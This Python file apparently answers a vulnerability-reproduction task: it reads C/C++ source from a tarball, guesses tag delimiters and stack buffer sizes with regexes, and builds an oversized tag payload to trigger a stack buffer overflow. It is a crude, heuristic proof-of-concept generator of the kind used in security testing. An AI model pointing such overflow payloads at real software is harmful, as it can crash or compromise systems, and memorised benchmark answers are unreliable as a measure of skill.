import tarfile
import re
import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Default parameters in case scanning fails
        buffer_size = 1024
        start_tag = b'<'
        end_tag = b'>'
        
        try:
            with tarfile.open(src_path, 'r') as tar:
                # Combine all source code into one string for analysis
                code_content = ""
                for member in tar.getmembers():
                    if member.isfile() and re.search(r'\.(c|cpp|cc|cxx|h|hpp)$', member.name, re.IGNORECASE):
                        try:
                            f = tar.extractfile(member)
                            if f:
                                code_content += f.read().decode('utf-8', errors='ignore') + "\n"
                        except Exception:
                            continue
                
                # 1. Determine Tag Delimiters
                # Heuristic: Check for common delimiter characters in the source code literals
                delimiters = [('<', '>'), ('[', ']'), ('{', '}')]
                best_delim = ('<', '>')
                max_count = -1
                
                for start, end in delimiters:
                    # Count occurrences of char literals like '<' or string literals containing them
                    c = code_content.count(f"'{start}'") + code_content.count(f'"{start}"')
                    if c > max_count:
                        max_count = c
                        best_delim = (start, end)
                
                start_tag = best_delim[0].encode()
                end_tag = best_delim[1].encode()
                
                # 2. Determine Buffer Size
                # Parse preprocessor definitions for constants
                defines = {}
                for m in re.finditer(r'#define\s+(\w+)\s+(\d+)', code_content):
                    defines[m.group(1)] = int(m.group(2))
                
                # Find stack buffer declarations: char name[size]
                candidates = []
                # Regex matches: char buf[1024] or char buf[CONST]
                pattern = r'char\s+(\w+)\s*\[\s*(\w+)\s*\]'
                for m in re.finditer(pattern, code_content):
                    name = m.group(1)
                    val = m.group(2)
                    size = 0
                    
                    if val.isdigit():
                        size = int(val)
                    elif val in defines:
                        size = defines[val]
                    
                    # Filter for plausible stack buffer sizes (e.g. not global 10MB arrays)
                    if 0 < size < 65536:
                        candidates.append((name, size))
                
                # Score candidates to find the most likely vulnerability target
                # We look for names like "tag", "buf" and common power-of-2 sizes
                best_size = 0
                max_score = -1
                
                for name, size in candidates:
                    score = 0
                    n_lower = name.lower()
                    if 'tag' in n_lower: score += 10
                    if 'buf' in n_lower: score += 5
                    if 'tmp' in n_lower: score += 2
                    if 'name' in n_lower: score += 2
                    
                    if size in [64, 128, 256, 512, 1024, 2048, 4096]:
                        score += 3
                        
                    if score > max_score:
                        max_score = score
                        best_size = size
                    elif score == max_score:
                        # If scores are equal, pick the larger one to ensure overflow works
                        # if the vulnerability is in the larger buffer
                        best_size = max(best_size, size)
                
                if best_size > 0:
                    buffer_size = best_size

        except Exception:
            pass
        
        # 3. Construct PoC
        # To trigger a stack buffer overflow, we need to exceed the buffer size
        # enough to overwrite control structures (like the return address).
        # Adding 128 bytes of padding is usually sufficient and keeps the PoC relatively short.
        overflow_length = buffer_size + 128
        
        # Ensure the payload is not trivially small if buffer detection failed (min 512 bytes)
        if overflow_length < 512:
            overflow_length = 512
            
        # The description "when a tag is found" suggests the overflow happens 
        # while processing the content inside the delimiters.
        payload = start_tag + b'A' * overflow_length + end_tag
        
        return payload